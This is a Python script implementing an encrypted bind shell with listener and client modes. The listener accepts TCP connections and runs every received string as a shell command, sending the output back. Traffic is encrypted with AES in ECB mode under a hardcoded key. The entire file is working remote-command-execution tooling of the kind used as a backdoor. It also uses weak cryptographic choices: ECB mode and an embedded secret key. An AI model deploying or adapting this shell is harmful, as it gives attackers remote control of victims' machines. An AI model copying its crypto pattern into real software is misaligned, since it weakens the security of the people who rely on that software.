import socket, subprocess, threading, argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

DEFAULT_PORT = 1234
MAX_BUFFER = 4096
# The secret key used for encryption and decryption.
SECRET_KEY = b'T\xc0H\xf0T\x92\xc6\xc8\xeb\xe2\xfc9Q;\xd0f'

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else SECRET_KEY
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size))

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(encrypted), AES.block_size)
    
    def __str__(self) -> str:
        return "Key -> {}".format(self.key.hex())

def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except:
        output = b'[-] Command failed'
    return output

def shell_thread(my_socket, my_cipher):
    my_socket.send(my_cipher.encrypt(b"[+]Connected \n"))
    
    while True:
        data = my_socket.recv(MAX_BUFFER)
        if data:
            buffer = my_cipher.decrypt(data).decode("utf-8")
            if not buffer or buffer == "exit":
                my_socket.close()
                exit()
            output = execute_cmd(buffer)
            my_socket.send(my_cipher.encrypt(output))

def recv_thread(my_socket, my_cipher):
    while True:
        data = my_cipher.decrypt(my_socket.recv(MAX_BUFFER)).decode("utf-8")
        if data:
            print("\n" + data, end="", flush=True)

def send_thread(my_socket, my_cipher):
    while True:
        data = input() + "\n"
        my_socket.send(my_cipher.encrypt(data.encode()))

def server():
    my_cipher = AESCipher()
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.bind(("127.0.0.1", DEFAULT_PORT))
    my_socket.listen()
    print("[+] Starting bindshell")
    while True:
        client_socket, addr = my_socket.accept()
        threading.Thread(target=shell_thread, args=(client_socket, my_cipher)).start()

def client(ip):
    my_cipher = AESCipher()
    client_socet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socet.connect((ip, DEFAULT_PORT))
    threading.Thread(target=send_thread, args=(client_socet, my_cipher)).start()
    threading.Thread(target=recv_thread, args=(client_socet, my_cipher)).start()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
    parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
    args = parser.parse_args()
    if args.listen:
        server()
    elif args.connect:
        client(args.connect)

if __name__ == '__main__':
    main()
